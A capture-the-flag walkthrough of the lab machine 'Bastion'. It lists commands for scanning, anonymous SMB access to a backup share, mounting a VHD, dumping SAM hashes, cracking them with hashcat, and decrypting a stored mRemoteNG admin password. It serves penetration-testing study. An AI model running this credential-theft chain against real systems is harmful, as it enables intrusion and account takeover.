## Bastion

Difficulty: Easy

### User Flag

```
rustscan -a 10.10.10.134 --ulimit 5000 -- -A -sV -sC -oN nmap.txt -Pn
```

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/1c588381-d52b-4872-ad9b-249dbedbb4ca)

<br>

```
smbclient -L //10.10.10.134

smbclient //10.10.10.134/Backups

smbclient -m SMB2 -N '//10.10.10.134/Backups' -c 'timeout 120; iosize 16384; get \"WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" ' -U " "

# We could mount SMB on our machine
mount -t cifs //10.10.10.134/Backups /mnt/smb
```

![smbList](https://github.com/b1d0ws/OSCP/assets/58514930/06ba68ce-691f-4112-a84b-4f165373ccd1)

![connectingSMB](https://github.com/b1d0ws/OSCP/assets/58514930/6bc1f8d8-7589-4a6f-a92c-404d9b9a841a)

![downloadingVHD](https://github.com/b1d0ws/OSCP/assets/58514930/fb0e3138-3b21-49a9-99c6-0d824e6db67b)

<br>

Mount .vhd with [this tutorial](https://linux.how2shout.com/mount-virtual-hard-disk-vhd-file-ubuntu-linux/).

```
sudo guestfish --ro -a backup.vhd

run
list-filesystems
exit

sudo guestmount -a backup.vhd -m /dev/sda1 --ro /mnt/test
```

![guestfish](https://github.com/b1d0ws/OSCP/assets/58514930/73af2da8-b477-4da7-a73f-a291c2abbb3e)

![moutingVHD](https://github.com/b1d0ws/OSCP/assets/58514930/6d6e3c82-bcfe-4644-8e08-406fe90eae31)

<br>

We can now extract SAM and SYSTEM and get hashes with impacket-secretsdump.

```
impacket-secretsdump -sam SAM -system SYSTEM local
```

![secretsdump](https://github.com/b1d0ws/OSCP/assets/58514930/74b185fd-4423-4c27-94ef-4613d7149e44)

<br>

Crack it with hashcat.

```
hashcat -m 1000 hashes /usr/share/wordlists/rockyou.txt --force --potfile-disable
```

![hashcat](https://github.com/b1d0ws/OSCP/assets/58514930/fdb1111f-8c0a-4755-beac-bd942bcbab4f)

<br>

### Root Flag

Enumerating program files x86, we discover that mRemoteNG is on the machine.

![mRemoteNG](https://github.com/b1d0ws/OSCP/assets/58514930/7997a063-467e-457d-b70e-4f092d047a9d)

<br>

We can extract passwords from this application as taught [here](https://ethicalhackingguru.com/how-to-exploit-remote-connection-managers/) and login with SSH or psexec.

```
type C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml
Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="

python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2
```

![gettingAdminPassword](https://github.com/b1d0ws/OSCP/assets/58514930/99563c53-df4e-419a-8a96-428f36805d12)

![crackingAdminPassword](https://github.com/b1d0ws/OSCP/assets/58514930/771d3bd5-e340-4106-b003-12688c23eac5)
